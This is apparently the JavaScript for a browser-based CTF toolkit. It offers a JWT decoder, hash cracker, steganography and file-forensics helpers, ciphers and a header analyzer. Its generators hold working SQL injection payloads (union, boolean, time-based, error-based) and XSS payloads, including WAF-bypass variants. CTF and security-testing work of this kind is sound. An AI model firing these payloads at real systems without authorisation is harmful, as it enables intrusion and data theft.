function showMessage(message, type) {
    // Create message element
    const messageEl = document.createElement('div');
    messageEl.className = `message ${type}`;
    messageEl.textContent = message;

    // Insert at top of modal body
    const modalBody = document.getElementById('modalBody');
    modalBody.insertBefore(messageEl, modalBody.firstChild);

    // Remove after 3 seconds
    setTimeout(() => {
        if (messageEl.parentNode) {
            messageEl.parentNode.removeChild(messageEl);
        }
    }, 3000);
}

// JWT Decoder functions
function decodeJWT() {
    const token = document.getElementById('jwtInput').value.trim();
    const output = document.getElementById('jwtOutput');

    if (!token) {
        showMessage('Please enter a JWT token', 'error');
        return;
    }

    try {
        const parts = token.split('.');
        if (parts.length !== 3) {
            throw new Error('Invalid JWT format');
        }

        const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
        const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));

        let result = `<strong>Header:</strong>\n${JSON.stringify(header, null, 2)}\n\n`;
        result += `<strong>Payload:</strong>\n${JSON.stringify(payload, null, 2)}\n\n`;
        result += `<strong>Signature:</strong>\n${parts[2]}`;

        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('JWT decoded successfully!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid JWT token';
        showMessage('JWT decoding failed!', 'error');
    }
}

// SQL Injection functions
function generateSQLPayloads() {
    const url = document.getElementById('sqlUrl').value;
    const param = document.getElementById('sqlParam').value;
    const type = document.getElementById('sqlPayloadType').value;
    const output = document.getElementById('sqlOutput');

    if (!url || !param) {
        showMessage('Please enter URL and parameter', 'error');
        return;
    }

    const payloads = {
        union: [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT user(),database(),version()--",
            "' UNION SELECT table_name,column_name,1 FROM information_schema.columns--"
        ],
        boolean: [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND substring(user(),1,1)='a'--",
            "' AND (SELECT COUNT(*) FROM users)>0--"
        ],
        time: [
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT SLEEP(5))--",
            "'; SELECT pg_sleep(5)--",
            "' AND BENCHMARK(1000000,MD5(1))--"
        ],
        error: [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
    };

    let result = `<strong>${type.toUpperCase()} SQL Injection Payloads:</strong>\n\n`;
    payloads[type].forEach((payload, index) => {
        // Fix: Escape special characters in param value for RegExp
        const escapedParam = param.replace(/[-/\\^$*+?.()|[\]{}]/g, '\\$&');
        const testUrl = url.replace(new RegExp(`${escapedParam}=\\d+`), `${escapedParam}=${encodeURIComponent(payload)}`);
        result += `${index + 1}. ${payload}\n   URL: ${testUrl}\n\n`;
    });

    output.innerHTML = `<pre>${result}</pre>`;
    showMessage('SQL payloads generated successfully!', 'success');
}

// XSS Payload functions
function generateXSSPayloads() {
    const context = document.getElementById('xssContext').value;
    const bypass = document.getElementById('xssBypass').value;
    const output = document.getElementById('xssOutput');

    const payloads = {
        html: {
            basic: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>"
            ],
            filter: [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<img src=x onerror=prompt`XSS`>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ],
            waf: [
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
                "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,88,83,83,41))>",
                "<iframe src=data:text/html,<script>alert('XSS')</script>>"
            ]
        },
        attribute: {
            basic: [
                "\" onmouseover=\"alert('XSS')\"",
                "' autofocus onfocus='alert(1)'",
                "\" onclick=\"alert('XSS')\"",
                "' onload='alert(1)'"
            ]
        }
    };

    const selectedPayloads = payloads[context]?.[bypass] || payloads.html.basic;
    let result = `<strong>${context.toUpperCase()} Context - ${bypass.toUpperCase()} Payloads:</strong>\n\n`;
    selectedPayloads.forEach((payload, index) => {
        result += `${index + 1}. ${payload}\n`;
    });

    output.innerHTML = `<pre>${result}</pre>`;
    showMessage('XSS payloads generated successfully!', 'success');
}

// Hash Cracker functions
function crackHash() {
    const hash = document.getElementById('crackHash').value.trim().toLowerCase();
    const hashType = document.getElementById('crackHashType').value;
    const wordlistType = document.getElementById('wordlist').value;
    const output = document.getElementById('crackOutput');

    if (!hash) {
        showMessage('Please enter a hash', 'error');
        return;
    }

    const commonPasswords = ['password', '123456', 'admin', 'root', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master'];
    const rockyou = ['123456', 'password', '12345678', 'qwerty', '123456789', 'letmein', '1234567', 'football', 'iloveyou', 'admin'];

    let wordlist = wordlistType === 'custom' ? 
        document.getElementById('customWordlist').value.split('\n').filter(w => w.trim()) :
        wordlistType === 'rockyou' ? rockyou : commonPasswords;

    let found = false;
    let result = `<strong>Hash Cracking Results:</strong>\n\nHash: ${hash}\nType: ${hashType.toUpperCase()}\n\n`;

    for (let word of wordlist) {
        word = word.trim();
        if (!word) continue;

        let testHash = '';
        switch(hashType) {
            case 'md5':
                testHash = CryptoJS.MD5(word).toString();
                break;
            case 'sha1':
                testHash = CryptoJS.SHA1(word).toString();
                break;
            case 'sha256':
                testHash = CryptoJS.SHA256(word).toString();
                break;
        }

        if (testHash === hash) {
            result += `<strong style="color: #4caf50;">CRACKED!</strong>\nPlaintext: ${word}\n`;
            found = true;
            break;
        }
    }

    if (!found) {
        result += '<strong style="color: #f44336;">Hash not found in wordlist</strong>\nTry a different wordlist or hash type.';
    }

    output.innerHTML = `<pre>${result}</pre>`;
    showMessage(found ? 'Hash cracked successfully!' : 'Hash not found', found ? 'success' : 'error');
}

// Steganography functions
function analyzeSteganography() {
    const fileInput = document.getElementById('stegoImage');
    const analysisType = document.getElementById('stegoType').value;
    const output = document.getElementById('stegoOutput');

    if (!fileInput.files[0]) {
        showMessage('Please upload an image', 'error');
        return;
    }

    const file = fileInput.files[0];
    const reader = new FileReader();

    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);

            let result = `<strong>Steganography Analysis - ${analysisType.toUpperCase()}</strong>\n\n`;
            result += `Image: ${file.name}\nSize: ${img.width}x${img.height}\nFile Size: ${file.size} bytes\n\n`;

            switch(analysisType) {
                case 'lsb':
                    result += performLSBAnalysis(ctx, canvas.width, canvas.height);
                    break;
                case 'metadata':
                    result += 'Metadata extraction requires EXIF.js library or server-side processing.';
                    break;
                case 'strings':
                    result += 'String extraction from binary data would be performed here.';
                    break;
                case 'visual':
                    result += 'Visual analysis complete. Check for hidden patterns or anomalies.';
                    break;
            }

            output.innerHTML = `<pre>${result}</pre>`;
            showMessage('Steganography analysis completed!', 'success');
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
}

function performLSBAnalysis(ctx, width, height) {
    const imageData = ctx.getImageData(0, 0, width, height);
    const data = imageData.data;
    let result = 'LSB Analysis Results:\n\n';

    // Sample LSB extraction from first 100 pixels
    let extractedBits = '';
    for (let i = 0; i < Math.min(400, data.length); i += 4) {
        extractedBits += (data[i] & 1).toString(); // Red channel LSB
    }

    result += `Extracted LSBs (first 100 pixels): ${extractedBits}\n`;
    result += `Potential ASCII: ${binaryToAscii(extractedBits)}\n`;

    return result;
}

function binaryToAscii(binary) {
    let result = '';
    for (let i = 0; i < binary.length; i += 8) {
        const byte = binary.substr(i, 8);
        if (byte.length === 8) {
            const ascii = parseInt(byte, 2);
            if (ascii >= 32 && ascii <= 126) {
                result += String.fromCharCode(ascii);
            } else {
                result += '.';
            }
        }
    }
    return result;
}

// Binary converter functions
function textToBinary() {
    const text = document.getElementById('binaryInput').value;
    const output = document.getElementById('binaryOutput');

    const binary = text.split('').map(char => 
        char.charCodeAt(0).toString(2).padStart(8, '0')
    ).join(' ');

    output.textContent = binary;
    showMessage('Text converted to binary!', 'success');
}

function binaryToText() {
    const binary = document.getElementById('binaryInput').value.replace(/\s+/g, '');
    const output = document.getElementById('binaryOutput');

    try {
        const text = binary.match(/.{1,8}/g)
            .map(byte => String.fromCharCode(parseInt(byte, 2)))
            .join('');
        output.textContent = text;
        showMessage('Binary converted to text!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid binary input';
        showMessage('Conversion failed!', 'error');
    }
}

function textToDecimal() {
    const text = document.getElementById('binaryInput').value;
    const output = document.getElementById('binaryOutput');

    const decimal = text.split('').map(char => char.charCodeAt(0)).join(' ');
    output.textContent = decimal;
    showMessage('Text converted to decimal!', 'success');
}

function decimalToText() {
    const decimal = document.getElementById('binaryInput').value;
    const output = document.getElementById('binaryOutput');

    try {
        const text = decimal.split(/\s+/).map(num => String.fromCharCode(parseInt(num))).join('');
        output.textContent = text;
        showMessage('Decimal converted to text!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid decimal input';
        showMessage('Conversion failed!', 'error');
    }
}

// Password generator functions
function generatePasswords() {
    const length = parseInt(document.getElementById('passLength').value);
    const count = parseInt(document.getElementById('passCount').value);
    const includeUpper = document.getElementById('includeUpper').checked;
    const includeLower = document.getElementById('includeLower').checked;
    const includeNumbers = document.getElementById('includeNumbers').checked;
    const includeSymbols = document.getElementById('includeSymbols').checked;
    const output = document.getElementById('passwordOutput');

    let charset = '';
    if (includeUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (includeLower) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (includeNumbers) charset += '0123456789';
    if (includeSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';

    if (!charset) {
        showMessage('Please select at least one character set', 'error');
        return;
    }

    let passwords = [];
    for (let i = 0; i < count; i++) {
        let password = '';
        for (let j = 0; j < length; j++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        passwords.push(password);
    }

    output.innerHTML = `<pre>${passwords.join('\n')}</pre>`;
    showMessage('Passwords generated successfully!', 'success');
}

// File forensics functions
function analyzeFile() {
    const fileInput = document.getElementById('forensicsFile');
    const analysisType = document.getElementById('forensicsType').value;
    const output = document.getElementById('forensicsOutput');

    if (!fileInput.files[0]) {
        showMessage('Please upload a file', 'error');
        return;
    }

    const file = fileInput.files[0];
    const reader = new FileReader();

    reader.onload = function(e) {
        const arrayBuffer = e.target.result;
        const uint8Array = new Uint8Array(arrayBuffer);

        let result = `<strong>File Forensics Analysis - ${analysisType.toUpperCase()}</strong>\n\n`;
        result += `File: ${file.name}\nSize: ${file.size} bytes\nType: ${file.type}\n\n`;

        switch(analysisType) {
            case 'header':
                result += analyzeFileHeader(uint8Array);
                break;
            case 'strings':
                result += extractStrings(uint8Array);
                break;
            case 'metadata':
                result += 'Metadata analysis would extract EXIF, creation dates, etc.';
                break;
            case 'entropy':
                result += calculateEntropy(uint8Array);
                break;
        }

        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('File analysis completed!', 'success');
    };
    reader.readAsArrayBuffer(file);
}

function analyzeFileHeader(uint8Array) {
    const header = Array.from(uint8Array.slice(0, 16))
        .map(b => b.toString(16).padStart(2, '0'))
        .join(' ');

    const signatures = {
        '89 50 4e 47': 'PNG Image',
        'ff d8 ff': 'JPEG Image',
        '47 49 46 38': 'GIF Image',
        '50 4b 03 04': 'ZIP Archive',
        '52 61 72 21': 'RAR Archive',
        '25 50 44 46': 'PDF Document'
    };

    let fileType = 'Unknown';
    for (let sig in signatures) {
        if (header.startsWith(sig)) {
            fileType = signatures[sig];
            break;
        }
    }

    return `File Header Analysis:\nHex: ${header}\nDetected Type: ${fileType}\n\n`;
}

function extractStrings(uint8Array) {
    const minLength = 4;
    const strings = [];
    let currentString = '';

    for (let i = 0; i < uint8Array.length; i++) {
        const byte = uint8Array[i];
        if (byte >= 32 && byte <= 126) {
            currentString += String.fromCharCode(byte);
        } else {
            if (currentString.length >= minLength) {
                strings.push(currentString);
            }
            currentString = '';
        }
    }

    return `Extracted Strings (${strings.length} found):\n${strings.slice(0, 20).join('\n')}\n${strings.length > 20 ? '...(truncated)' : ''}\n\n`;
}

function calculateEntropy(uint8Array) {
    const freq = new Array(256).fill(0);
    for (let byte of uint8Array) {
        freq[byte]++;
    }

    let entropy = 0;
    const length = uint8Array.length;
    for (let count of freq) {
        if (count > 0) {
            const p = count / length;
            entropy -= p * Math.log2(p);
        }
    }

    return `Entropy Analysis:\nCalculated Entropy: ${entropy.toFixed(4)} bits\nFile appears to be: ${entropy > 7.5 ? 'Encrypted/Compressed' : 'Plain text/Low entropy'}\n\n`;
}

// Event listeners for dynamic UI updates
document.addEventListener('DOMContentLoaded', function() {
    const wordlistSelect = document.getElementById('wordlist');
    if (wordlistSelect) {
        wordlistSelect.addEventListener('change', function() {
            const customGroup = document.getElementById('customWordlistGroup');
            if (customGroup) {
                customGroup.style.display = this.value === 'custom' ? 'block' : 'none';
            }
        });
    }
});

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Close modal with Escape key
    if (e.key === 'Escape') {
        closeModal();
    }

    // Quick tool access with Ctrl + number
    if (e.ctrlKey && e.key >= '1' && e.key <= '6') {
        const sections = ['dashboard', 'crypto', 'web', 'forensics', 'reverse', 'pwn'];
        const sectionIndex = parseInt(e.key) - 1;
        if (sections[sectionIndex]) {
            document.querySelector(`[data-section="${sections[sectionIndex]}"]`).click();
        }
    }
});

// Initialize tooltips and other UI enhancements
document.addEventListener('DOMContentLoaded', function() {
    // Add loading states to buttons
    const buttons = document.querySelectorAll('.btn');
    buttons.forEach(button => {
        button.addEventListener('click', function() {
            const originalText = this.textContent;
            this.innerHTML = '<span class="loading"></span> Processing...';
            this.disabled = true;

            setTimeout(() => {
                this.textContent = originalText;
                this.disabled = false;
            }, 1000);
        });
    });

    // Add search functionality (placeholder)
    const searchBox = document.createElement('input');
    searchBox.type = 'text';
    searchBox.placeholder = 'Search tools...';
    searchBox.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 10px;
        border-radius: 8px;
        border: 1px solid rgba(233, 69, 96, 0.3);
        background: rgba(255, 255, 255, 0.1);
        color: white;
        z-index: 1001;
    `;
    document.body.appendChild(searchBox);

    console.log('CTF Arsenal Platform Loaded Successfully!');
});

// Cipher functions
function applyCipher(cipherType) {
    const input = document.getElementById('cipherInput').value;
    const output = document.getElementById('cipherOutput');

    let result = '';
    switch (cipherType) {
        case 'rot13':
            result = rot13(input);
            break;
        case 'atbash':
            result = atbash(input);
            break;
        default:
            result = 'Cipher not supported.';
    }

    output.textContent = result;
    showMessage(`Cipher applied: ${cipherType}`, 'success');
}

function clearCipher() {
    document.getElementById('cipherInput').value = '';
    document.getElementById('cipherOutput').textContent = '';
}

function rot13(text) {
    return text.replace(/[a-zA-Z]/g, function(char) {
        const start = char <= 'Z' ? 65 : 97;
        const code = char.charCodeAt(0);
        let shifted = ((code - start + 13) % 26) + start;
        return String.fromCharCode(shifted);
    });
}

function atbash(text) {
    return text.replace(/[a-zA-Z]/g, function(char) {
        const start = char <= 'Z' ? 65 : 97;
        const code = char.charCodeAt(0);
        let atbashCode = start + 25 - (code - start);
        return String.fromCharCode(atbashCode);
    });
}

// ASCII conversion functions
function textToAscii() {
    const text = document.getElementById('asciiInput').value;
    const output = document.getElementById('asciiOutput');

    const ascii = text.split('').map(char => char.charCodeAt(0)).join(' ');
    output.textContent = ascii;
    showMessage('Text converted to ASCII!', 'success');
}

function asciiToText() {
    const ascii = document.getElementById('asciiInput').value;
    const output = document.getElementById('asciiOutput');

    try {
        const text = ascii.split(' ').map(code => String.fromCharCode(code)).join('');
        output.textContent = text;
        showMessage('ASCII converted to text!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid ASCII input';
        showMessage('Conversion failed!', 'error');
    }
}

// Specific hash functions
async function generateSpecificHash() {
    const text = document.getElementById('hashTextInput').value;
    const hashType = document.getElementById('selectedHashType').value;
    const output = document.getElementById('specificHashOutput');

    if (!text) {
        showMessage('Please enter text to hash', 'error');
        return;
    }

    try {
        const encoder = new TextEncoder();
        const data = encoder.encode(text);
        let hashBuffer;

        switch(hashType) {
            case 'md5':
                output.textContent = CryptoJS.MD5(text).toString();
                break;
            case 'sha1':
                hashBuffer = await crypto.subtle.digest('SHA-1', data);
                break;
            case 'sha256':
                hashBuffer = await crypto.subtle.digest('SHA-256', data);
                break;
            case 'sha512':
                hashBuffer = await crypto.subtle.digest('SHA-512', data);
                break;
        }

        if (hashType !== 'md5' && hashBuffer) {
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            output.textContent = hashHex;
        }

        showMessage(`${hashType.toUpperCase()} hash generated successfully!`, 'success');
    } catch (error) {
        output.textContent = 'Error generating hash';
        showMessage('Hash generation failed!', 'error');
    }
}

// Rainbow table lookup function
function rainbowLookup() {
    const hash = document.getElementById('rainbowHash').value.trim();
    const output = document.getElementById('rainbowOutput');
    // Placeholder - replace with actual rainbow table lookup implementation
    output.textContent = 'Rainbow table lookup is under development.';
    showMessage('Rainbow table lookup is under development.', 'info');
}

// Metadata extraction function
function extractMetadata() {
    const fileInput = document.getElementById('metadataFile');
    const output = document.getElementById('metadataOutput');
    if (!fileInput.files[0]) {
        showMessage('Please upload a file', 'error');
        return;
    }
    const file = fileInput.files[0];
    // Placeholder - replace with actual metadata extraction implementation
    output.textContent = 'Metadata extraction is under development.';
    showMessage('Metadata extraction is under development.', 'info');
}

// Hex viewer function
function viewHex() {
    const fileInput = document.getElementById('hexViewerFile');
    const textInput = document.getElementById('hexViewerInput').value;
    const output = document.getElementById('hexViewerOutput');

    if (fileInput.files[0]) {
        const file = fileInput.files[0];
        const reader = new FileReader();

        reader.onload = function(e) {
            const arrayBuffer = e.target.result;
            const uint8Array = new Uint8Array(arrayBuffer);
            const hexView = Array.from(uint8Array)
                .map(byte => byte.toString(16).padStart(2, '0'))
                .join(' ');
            output.textContent = hexView;
            showMessage('Hex view generated!', 'success');
        };
        reader.readAsArrayBuffer(file);
    } else if (textInput) {
        // Convert hex input to formatted hex view
        output.textContent = textInput;
        showMessage('Hex view generated from input!', 'success');
    } else {
        showMessage('Please upload a file or enter hex data.', 'error');
    }
}

// JavaScript beautifier functions
function beautifyJS() {
    const jsInput = document.getElementById('jsInput').value;
    const output = document.getElementById('jsOutput');

    try {
        const beautified = js_beautify(jsInput); // Requires js_beautify library
        output.textContent = beautified;
        showMessage('JavaScript code beautified!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid JavaScript code';
        showMessage('Beautify failed!', 'error');
    }
}

function minifyJS() {
    const jsInput = document.getElementById('jsInput').value;
    const output = document.getElementById('jsOutput');

    try {
        const minified = js_beautify.js_minify(jsInput);
        output.textContent = minified;
        showMessage('JavaScript code minified!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid JavaScript code';
        showMessage('Minify failed!', 'error');
    }
}

// Header analyzer function
async function analyzeHeaders() {
    const url = document.getElementById('headerUrl').value;
    const output = document.getElementById('headerOutput');

    if (!url) {
        showMessage('Please enter a URL to analyze', 'error');
        return;
    }

    try {
        const response = await fetch(url);
        let headersText = '';
        for (let [key, value] of response.headers.entries()) {
            headersText += `${key}: ${value}\n`;
        }
        output.textContent = headersText;

        // Security header analysis (basic)
        let securityAnalysis = 'Security Header Analysis:\n';
        if (!response.headers.has('Content-Security-Policy')) {
            securityAnalysis += '- Content Security Policy (CSP) missing\n';
        }
        if (!response.headers.has('X-Frame-Options')) {
            securityAnalysis += '- X-Frame-Options missing\n';
        }
        if (!response.headers.has('Strict-Transport-Security')) {
            securityAnalysis += '- Strict Transport Security (HSTS) missing\n';
        }
        output.textContent = securityAnalysis + headersText;

        showMessage('Headers analyzed successfully!', 'success');
    } catch (error) {
        output.textContent = `Error: Could not fetch headers - ${error}`;
        showMessage('Header analysis failed!', 'error');
    }
}
